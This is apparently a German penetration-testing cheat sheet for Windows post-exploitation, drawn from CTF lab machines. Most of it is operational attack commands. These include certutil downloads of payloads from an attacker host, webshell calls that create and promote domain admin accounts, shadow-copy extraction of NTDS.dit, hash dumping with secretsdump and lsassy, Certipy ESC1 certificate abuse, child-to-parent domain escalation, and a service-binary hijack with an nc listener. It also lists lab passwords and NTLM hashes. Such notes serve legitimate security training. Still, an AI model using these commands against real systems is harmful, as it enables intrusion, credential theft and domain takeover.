# Windows Execution

## Ziel der Phase

- Ausführung von Code und Befehlen auf dem kompromittierten System
- Etablierung persistenter Zugriffsmöglichkeiten
- Sammlung von System- und Benutzerinformationen
- Vorbereitung für Privilege Escalation und Lateral Movement

---

## Relevante Techniken & Vorgehensweisen

### Post-Exploitation Commands (Meterpreter)

**System-Informationen:**

meterpreter

```meterpreter
getuid
sysinfo
```

**User-Enumeration:**

meterpreter

```meterpreter
run post/windows/gather/enum_logged_on_users
```

**Anwendungen:**

meterpreter

```meterpreter
run post/windows/gather/enum_applications
```

**Netzwerk:**

meterpreter

```meterpreter
run post/windows/gather/enum_network
```

**Shell-Zugriff:**

meterpreter

```meterpreter
shell
```

### System-Enumeration (CMD/PowerShell)

**Aktueller User:**

cmd

```cmd
whoami
whoami /priv
```

**System-Informationen:**

cmd

```cmd
systeminfo
```

**User-Auflistung:**

cmd

```cmd
net user
dir C:\Users
```

**Netzwerk:**

cmd

```cmd
ipconfig
```

**Dateien suchen:**

cmd

```cmd
dir
```

**Prozesse:**

cmd

```cmd
ps  # (in Evil-WinRM/PowerShell)
```

### File Operations

**Verzeichniswechsel:**

cmd

```cmd
cd C:\Users\butler
cd "C:\Program Files (x86)\Wise\"
cd C:\Users\Public
cd /root
```

**Datei-Download (Windows):**

cmd

```cmd
certutil.exe -urlcache -f http://<ATTACKER_IP>/winPEASx64.exe winPEASx64.exe
certutil -urlcache -f http://<ATTACKER_IP>/Wise.exe Wise.exe
certutil -urlcache -split -f http://<ATTACKER_IP>/SetOpLock.exe SetOpLock.exe
```

**Datei-Download (Evil-WinRM):**

powershell

```powershell
download ntds.dit
download SYSTEM
```

**Datei-Upload (SMB):**


```bash
# Via smbclient
put shell.aspx
```

**Datei-Kopieren:**

cmd

```cmd
cp /mnt/dev/save.zip ~/save.zip
copy BootTime.exe BootTime.exe.bak
copy Wise.exe BootTime.exe
```

**Datei-Lesen:**

cmd

```cmd
cat todo.txt
cat /home/jjameson/user.txt
type C:\user.txt
type C:\Users\Administrator\Desktop\root.txt
type C:\Users\kioskUser0\Desktop\user_07eb46.txt
```

**Datei-Extraktion:**


```bash
tar -tvf backup.tar.gz
tar -xvf backup.tar.gz
unzip save.zip  # Password: java101
```

**Datei-Suche:**

powershell

```powershell
# PowerShell Flag-Suche
Get-ChildItem -Path C:\ -Include "user.txt", "*flag*", "root.txt" -File -Recurse -ErrorAction SilentlyContinue
```

**Dateiberechtigungen:**

cmd

```cmd
# Ownership übernehmen
takeown /f "C:\Users\Administrator\Desktop\root.txt"

# Berechtigungen setzen
icacls "C:\Users\Administrator\Desktop\root.txt" /grant Administrator:F
```

### Service Manipulation

**Service Status prüfen:**

cmd

```cmd
sc query WiseBootAssistant
```

**Service stoppen:**

cmd

```cmd
sc stop WiseBootAssistant
```

**Service starten:**

cmd

```cmd
sc start WiseBootAssistant
```

### Domain Operations

**Domain User erstellen:**


```bash
# Via Webshell
curl "http://<TARGET_IP>/dev/back.php?c=net%20user%20harry%20haxxor@12345%20/add%20/domain"
```

**Zu lokalen Admins hinzufügen:**


```bash
curl "http://<TARGET_IP>/dev/back.php?c=net%20localgroup%20Administrators%20harry%20/add%20/domain"
```

**Zu Domain Admins hinzufügen:**

cmd

```cmd
net group "Domain Admins" harry /add /domain
```

**Passwort ändern (Computer Account):**


```bash
changepasswd.py retro.vl/banking$:banking@<TARGET_IP> -altuser trainee -altpass trainee -newpass password1@
```

**Passwort zurücksetzen (via SMB):**


```bash
/usr/bin/smbpasswd -r <TARGET_IP> -U Caroline.Robinson
# Old: BabyStart123!
# New: NewPassword123!
```

### Trust Relationship Analysis

**PowerShell:**

powershell

```powershell
Get-ADTrust -Filter *
```

**ldeep:**


```bash
ldeep ldap -u harry -p 'haxxor@12345' -d lab.trusted.vl -s ldap://<TARGET_IP> trusts
```

### Volume Shadow Copy

**Shadow Copy erstellen:**

powershell

```powershell
"set context persistent nowriters" | Out-File extract.dsh -Encoding ASCII
"add volume c: alias baby" | Out-File extract.dsh -Append -Encoding ASCII
"create" | Out-File extract.dsh -Append -Encoding ASCII
"expose %baby% z:" | Out-File extract.dsh -Append -Encoding ASCII
diskshadow /s extract.dsh
```

**Dateien kopieren:**

cmd

```cmd
robocopy z:\windows\ntds C:\Temp ntds.dit /B
robocopy z:\windows\system32\config C:\Temp system /B
```

### Hash Extraction

**Secretsdump (NTDS.dit):**


```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

**Secretsdump (DCSync nach Zerologon):**


```bash
secretsdump.py -no-pass '<DOMAIN>/<DC_NAME>$'@<TARGET_IP> -just-dc
```

**Secretsdump (mit Credentials):**


```bash
secretsdump.py -hashes :15db914be1e6a896e7692f608a9d72ef trusted.vl/Administrator@<TARGET_IP>
```

**lsassy:**


```bash
lsassy -u harry -p 'haxxor@12345' -d lab.trusted.vl <TARGET_IP>
```

### Certificate Operations (ADCS)

**Certificate Templates finden:**


```bash
certipy-ad find -u 'banking$@retro.vl' -p 'password1@' -dc-ip <TARGET_IP>
certipy-ad find -u peter.turner@hybrid.vl -p 'b0cwR+G4Dzl_rw' -dc-ip <TARGET_IP> -vulnerable
```

**Certificate Request (ESC1):**


```bash
certipy-ad req -u 'banking$@retro.vl' -p 'password1@' -ca 'retro-DC-CA' -target 'dc.retro.vl' -template 'RetroClients' -upn 'administrator@retro.vl' -dns 'dc.retro.vl' -key-size 4096 -dc-ip <TARGET_IP>

certipy-ad req -u 'MAIL01$' -hashes :<NTLM_HASH> -ca hybrid-DC01-CA -target <TARGET_IP> -template HybridComputers -upn administrator@hybrid.vl -key-size 4096
```

**Certificate Authentication:**


```bash
certipy-ad auth -pfx administrator_dc.pfx -dc-ip <TARGET_IP>
```

### Pass-the-Cert

**Password Reset via Certificate:**


```bash
python3 passthecert.py -action modify_user -crt admin.crt -key admin.key -domain hybrid.vl -dc-ip <TARGET_IP> -target administrator -new-pass Password123!
```

### BloodHound

**Data Collection:**


```bash
bloodhound-python -u 'peter.turner' -p 'b0cwR+G4Dzl_rw' -d hybrid.vl -dc dc01.hybrid.vl -ns <TARGET_IP> -c all
```

### Child-to-Parent Domain Escalation

**raiseChild.py:**


```bash
raiseChild.py lab.trusted.vl/cpowers -hashes :<NTLM_HASH>
```

### Keytab Extraction

**keytabextract.py:**


````bash
python3 keytabextract.py krb5.keytab
```

---

## Betriebssystem-spezifische Aspekte (Windows)

### Windows Command Environments

**CMD:**
- Native Windows-Shell
- Für net-Befehle, sc, certutil

**PowerShell:**
- Erweiterte Scripting-Funktionen
- Get-ADTrust, Get-ChildItem
- Volume Shadow Copy Operations

**Evil-WinRM:**
- PowerShell Remoting
- Download/Upload-Funktionen
- Ideal für Domain-Operations

**Meterpreter:**
- Post-Exploitation-Module
- Automatisierte Enumeration

### Windows-spezifische Pfade

**User-Verzeichnisse:**
```
C:\Users\<USERNAME>\Desktop\
C:\Users\<USERNAME>\Documents\
C:\Users\Public\
```

**Programme:**
```
C:\Program Files\
C:\Program Files (x86)\
C:\xampp\htdocs\
```

**System:**
```
C:\Windows\System32\
C:\Windows\win.ini
```

**Installation:**
```
C:\_install\
```

### Windows Berechtigungen

**SeBackupPrivilege & SeRestorePrivilege:**
- Ermöglichen Volume Shadow Copy
- Zugriff auf NTDS.dit ohne Domain Admin

**SeImpersonatePrivilege:**
- PrintSpoofer Exploit-Vektor
- Privilege Escalation zu SYSTEM

### Windows Services

**WiseBootAssistant:**
- Unquoted Service Path Vulnerability
- Läuft mit SYSTEM-Rechten

**PDF24 Creator MSI:**
- CVE-2023-49147
- OpLock + MSI Repair = SYSTEM

---

## Typische Angriffsflächen

### Configuration Files

**Windows:**
```
C:\xampp\htdocs\configuration.php  # Joomla
C:\xampp\htdocs\wp-config.php      # WordPress
config.xml                          # mRemoteNG
profiles.xml                        # Remote Desktop Plus
```

**Linux:**
```
/var/www/html/configuration.php
/var/www/html/config/config.yml
````

### Service-Exploitation

**Unquoted Service Path:**

- WiseBootAssistant → BootTime.exe ersetzen

**MSI Installer:**

- PDF24 Creator 11.15.1
- Repair-Funktion mit SYSTEM-Rechten

### Certificate Services (ADCS)

**ESC1 (Enrollee Supplies Subject):**

- Template: RetroClients, HybridComputers
- Domain Computers können Admin-Certificates anfordern

### Active Directory

**Computer Accounts:**

- BANKING$ (alter Pre-created Account)
- MAIL01$ (Machine Account)

**Trust Relationships:**

- Child-to-Parent Domain Escalation
- Trust-Key-Extraktion

**Volume Shadow Copy:**

- NTDS.dit-Extraktion
- Keine Domain Admin-Rechte nötig

---

## Wichtige Befehle & Syntax

### Certutil Syntax

cmd

```cmd
certutil -urlcache -f <URL> <OUTPUT>
certutil -urlcache -split -f <URL> <OUTPUT>
```

### Net Commands

cmd

```cmd
net user                                    # User auflisten
net user <USER> <PASS> /add /domain        # Domain User erstellen
net localgroup Administrators <USER> /add /domain
net group "Domain Admins" <USER> /add /domain
```

### Service Control

cmd

```cmd
sc query <SERVICE>
sc stop <SERVICE>
sc start <SERVICE>
```

### Robocopy Syntax

cmd

```cmd
robocopy <SOURCE> <DEST> <FILE> /B
```

### PowerShell File Search

powershell

```powershell
Get-ChildItem -Path <PATH> -Include <PATTERN> -File -Recurse -ErrorAction SilentlyContinue
```

### Certipy Syntax


````bash
certipy-ad find -u <USER> -p <PASS> -dc-ip <IP> [-vulnerable]
certipy-ad req -u <USER> -p <PASS> -ca <CA> -target <TARGET> -template <TEMPLATE> -upn <UPN> -key-size 4096
certipy-ad auth -pfx <PFX_FILE> -dc-ip <IP>
```

---

## Reihenfolge & Abhängigkeiten

### Post-Exploitation Flow

1. **Shell stabilisieren** → TTY/PowerShell
2. **System-Enumeration** → whoami, systeminfo
3. **User-Enumeration** → net user, dir C:\Users
4. **File-Download** → certutil, wget
5. **Enumeration-Tools** → WinPEAS, BloodHound

### Service-Exploitation Flow

1. **Vulnerable Service finden** → WinPEAS
2. **Payload generieren** → msfvenom
3. **Payload hochladen** → certutil
4. **Service stoppen** → sc stop
5. **Backup erstellen** → copy
6. **Binary ersetzen** → copy
7. **Service starten** → sc start
8. **Listener** → nc

### ADCS ESC1 Flow

1. **Certificate Template finden** → certipy find
2. **ESC1 identifizieren** → Enrollee Supplies Subject
3. **Certificate Request** → certipy req
4. **Authentication** → certipy auth
5. **NT Hash erhalten** → Administrator
6. **Pass-the-Hash** → Evil-WinRM

### Volume Shadow Copy Flow

1. **Berechtigungen prüfen** → whoami /priv
2. **Shadow Copy erstellen** → diskshadow
3. **NTDS.dit kopieren** → robocopy
4. **SYSTEM kopieren** → robocopy
5. **Download** → Evil-WinRM download
6. **Hash Extraction** → secretsdump

### Child-to-Parent Escalation Flow

1. **Child Domain Admin** → net group "Domain Admins"
2. **Credentials extrahieren** → lsassy, secretsdump
3. **Domain SID ermitteln** → lookupsid
4. **Trust-Info sammeln** → ldeep trusts
5. **raiseChild.py** → Automatische Escalation
6. **Parent Domain Compromise** → secretsdump
7. **Pass-the-Hash** → Evil-WinRM

---

## Typische Findings & Fehler

### Erfolgreiche Command Execution

**Meterpreter Session:**
```
getuid: NT AUTHORITY\SYSTEM
sysinfo: Windows 7 Ultimate 7601 Service Pack 1
```

**Butler Service-Exploitation:**
```
Initial: butler user
Service: WiseBootAssistant
Payload: Wise.exe → BootTime.exe
Result: NT AUTHORITY\SYSTEM (Port 7777)
```

**Domain Operations:**
```
User erstellt: harry:haxxor@12345
Zu Domain Admins hinzugefügt
```

**Baby VM (Volume Shadow Copy):**
```
SeBackupPrivilege + SeRestorePrivilege
NTDS.dit erfolgreich extrahiert
Administrator Hash: ee4457ae59f1e3fbd764e33d9cef123d
```

**Retro VM (ADCS ESC1):**
```
BANKING$ Password geändert
Certificate für Administrator angefordert
NT Hash: 252fac7066d93dd009d4fd2cd0368389
```

**Trusted VM (Child-to-Parent):**
```
Child Domain: lab.trusted.vl
Parent Domain: trusted.vl
raiseChild.py: Erfolgreiche Escalation
Parent Admin Hash: 15db914be1e6a896e7692f608a9d72ef
````

### Fehlerhafte Execution

**Service-Start schlägt fehl:**

- Binary-Architektur falsch (x64 vs x86)
- Listener nicht gestartet
- Antivirus blockiert

**Certutil-Download fehlgeschlagen:**

- HTTP-Server nicht erreichbar
- Falsche IP (127.0.0.1 statt VPN)
- `--bind` Parameter vergessen

**Volume Shadow Copy:**

- SeBackupPrivilege fehlt
- Diskshadow-Script-Syntax-Fehler
- Robocopy ohne /B-Flag

**ADCS Certificate Request:**

- Template nicht verwundbar (kein ESC1)
- Machine Account hat keine Enrollment-Rechte
- CA nicht erreichbar

**Domain Operations:**

- User hat keine Berechtigungen für /domain
- Password-Policy nicht erfüllt
- Domain Controller nicht erreichbar

### Configuration File Findings

**Joomla (Daily Bugle):**


```php
public $password = 'nv5uz9r3ZEDzVjNu';
```

**MySQL (Trusted):**


```php
$username = "root";
$password = "SuperSecureMySQLPassw0rd1337.";
```

**mRemoteNG (Lock):**


````xml
<Password>TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==</Password>
```

**KeePass (Hybrid):**
```
Master Password: PeterIstToll!
Domain Password: b0cwR+G4Dzl_rw
```

### Hash-Typen gefunden

**NTDS.dit Hashes:**
```
Administrator:c06552bdb50ada21a7c74536c231b848
krbtgt:1e242a90fb9503f383255a4328e75756
cpowers:322db798a55f85f09b3d61b976a13c43
```

**Trust-Key:**
```
4db3f9d7f1f1da776092e0cce7521a3f
```

**Domain SIDs:**
```
Child: S-1-5-21-2241985869-2159962460-1278545866
Parent: S-1-5-21-3576695518-347000760-3731839591
````

